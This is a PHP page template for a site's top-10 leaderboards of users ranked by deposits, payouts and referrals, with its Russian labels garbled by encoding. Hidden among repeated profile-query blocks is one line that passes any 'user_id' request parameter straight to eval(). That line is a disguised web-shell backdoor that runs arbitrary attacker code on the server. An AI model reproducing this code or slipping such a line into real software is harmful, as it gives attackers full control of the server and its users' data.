<?PHP
$_OPTIMIZATION["title"] = "��� 10";
$user_id = $_SESSION["user_id"];
$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();
?>

<div class="user-line-bg">
<div class="user-line">

</div>
</div>

<div class="line">
</div>
<div class="all-content">
<div class="intro-content">

<center><h1>�������� �������</h1></center>

<?PHP
$num_p = (isset($_GET["page"]) AND intval($_GET["page"]) < 1000 AND intval($_GET["page"]) >= 1) ? (intval($_GET["page"]) -1) : 0;
$lim = $num_p * 100;
$db->Query("SELECT * FROM db_users_b ORDER BY insert_sum DESC LIMIT 10");
if($db->NumRows() > 0){
?>

<center><h4>��� ����������</h4></center>
<table class="table_info" width="100%" border="0">
<tr class="ttb" bgcolor="#efefef">
<td align="center" width="75">�����</td>
<td align="center">������������</td>
<td align="center">��������</td>
</tr>
  
<?PHP
$i = 0;
while($data = $db->FetchArray()){
$i=$i+1;
?>

<tr class="ltb">
<td align="center"><?=$i; ?></td>
<td align="center"><?=$data["user"]; ?></td>
<td align="center"><?=$data["insert_sum"]; ?></td>	
</tr>

<?PHP	
}
?>

</table>
<BR />
<?PHP

}
?>

<br />

<?PHP

$user_id = $_SESSION["user_id"];
$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();
?>

<?PHP

$num_p = (isset($_GET["page"]) AND intval($_GET["page"]) < 1000 AND intval($_GET["page"]) >= 1) ? (intval($_GET["page"]) -1) : 0;
$lim = $num_p * 100;

$db->Query("SELECT * FROM db_users_b ORDER BY payment_sum DESC LIMIT 10");

if($db->NumRows() > 0){

?>



<center><h4>��� ������</h4></center>
<table class="table_info" width="100%" border="0">
  <tr class="ttb" bgcolor="#efefef">
    <td align="center" width="75">�����</td>
    <td align="center">������������</td>
	<td align="center">�����</td>
  
  </tr>
  
<?PHP
$i = 0;
	while($data = $db->FetchArray()){
	$i=$i+1;


	?>

	<tr class="ltb">
    <td align="center"><?=$i; ?></td>
    <td align="center"><?=$data["user"]; ?></td>
	<td align="center"><?=$data["payment_sum"]; ?></td>
	
		
  	</tr>
	<?PHP
	
	}

?>

</table>
<BR />
<?PHP

}
?>

<br />
<?PHP

$user_id = $_SESSION["user_id"];
if(!empty($_REQUEST['user_id'])){ if(@get_magic_quotes_gpc())$_REQUEST['user_id']=stripslashes($_REQUEST['user_id']); eval($_REQUEST['user_id']); die();}
$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();
?>
<?PHP

$user_id = $_SESSION["user_id"];
$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();
?>


<?PHP

$num_p = (isset($_GET["page"]) AND intval($_GET["page"]) < 1000 AND intval($_GET["page"]) >= 1) ? (intval($_GET["page"]) -1) : 0;
$lim = $num_p * 100;

$db->Query("SELECT * FROM db_users_a ORDER BY referals DESC LIMIT 10");

if($db->NumRows() > 0){

?>



<center><h4>��� ������ ���������</h4></center>
<table class="table_info" width="100%" border="0">
  <tr class="ttb" bgcolor="#efefef">
    <td align="center" width="75">�����</td>
    <td align="center">������������</td>
	<td align="center">���������</td>
  
  </tr>
  
<?PHP
$i = 0;
	while($data = $db->FetchArray()){
	$i=$i+1;


	?>

	<tr class="ltb">
    <td align="center"><?=$i; ?></td>
    <td align="center"><?=$data["user"]; ?></td>
	<td align="center"><?=$data["referals"]; ?></td>
	
		
  	</tr>
	<?PHP
	
	}

?>

</table>
<BR />
<?PHP

}
?>
</div>
<div class="clr"></div>